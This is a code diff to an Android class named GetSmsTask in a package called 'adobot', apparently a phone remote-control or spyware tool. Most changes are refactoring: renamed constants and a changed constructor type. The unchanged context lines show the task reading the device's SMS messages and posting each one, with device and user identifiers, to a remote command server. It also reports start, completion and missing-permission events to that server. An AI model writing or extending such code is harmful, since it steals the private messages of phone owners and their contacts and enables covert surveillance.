@@ -2,14 +2,14 @@ package com.android.adobot.tasks;
 
 import android.Manifest;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
 
-import com.android.adobot.CommandService;
-import com.android.adobot.CommonParams;
+import com.android.adobot.AdobotConstants;
 
 import org.json.JSONObject;
 
@@ -17,11 +17,8 @@ import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.HashMap;
 
-import com.android.adobot.Constants;
 import com.android.adobot.http.Http;
 import com.android.adobot.http.HttpRequest;
-
-import io.socket.client.Socket;
 
 public class GetSmsTask extends BaseTask {
 
@@ -29,7 +26,7 @@ public class GetSmsTask extends BaseTask {
 
     private int numsms;
 
-    public GetSmsTask(CommandService client, int numsms) {
+    public GetSmsTask(Context client, int numsms) {
         setContext(client);
         this.numsms = numsms;
     }
@@ -50,7 +47,7 @@ public class GetSmsTask extends BaseTask {
             start.put("uid", commonParams.getUid());
             start.put("device", commonParams.getDevice());
             Http req = new Http();
-            req.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+            req.setUrl(commonParams.getServer() + AdobotConstants.NOTIFY_URL);
             req.setMethod(HttpRequest.METHOD_POST);
             req.setParams(start);
             req.execute();
@@ -90,7 +87,7 @@ public class GetSmsTask extends BaseTask {
 
                         Http smsHttp = new Http();
                         smsHttp.setMethod(HttpRequest.METHOD_POST);
-                        smsHttp.setUrl(commonParams.getServer() + Constants.POST_MESSAGE_URL);
+                        smsHttp.setUrl(commonParams.getServer() + AdobotConstants.POST_MESSAGE_URL);
                         smsHttp.setParams(p);
                         smsHttp.execute();
 
@@ -109,7 +106,7 @@ public class GetSmsTask extends BaseTask {
                 done.put("uid", commonParams.getUid());
                 done.put("device", commonParams.getDevice());
                 Http doneSMS = new Http();
-                doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+                doneSMS.setUrl(commonParams.getServer() + AdobotConstants.NOTIFY_URL);
                 doneSMS.setMethod(HttpRequest.METHOD_POST);
                 doneSMS.setParams(done);
                 doneSMS.execute();
@@ -121,7 +118,7 @@ public class GetSmsTask extends BaseTask {
             done.put("uid", commonParams.getUid());
             done.put("device", commonParams.getDevice());
             Http doneSMS = new Http();
-            doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+            doneSMS.setUrl(commonParams.getServer() + AdobotConstants.NOTIFY_URL);
             doneSMS.setMethod(HttpRequest.METHOD_POST);
             doneSMS.setParams(done);
             doneSMS.execute();
@@ -135,7 +132,7 @@ public class GetSmsTask extends BaseTask {
             noPermit.put("device", commonParams.getDevice());
             noPermit.put("permission", "READ_SMS");
             Http doneSMS = new Http();
-            doneSMS.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+            doneSMS.setUrl(commonParams.getServer() + AdobotConstants.NOTIFY_URL);
             doneSMS.setMethod(HttpRequest.METHOD_POST);
             doneSMS.setParams(noPermit);
             doneSMS.execute();
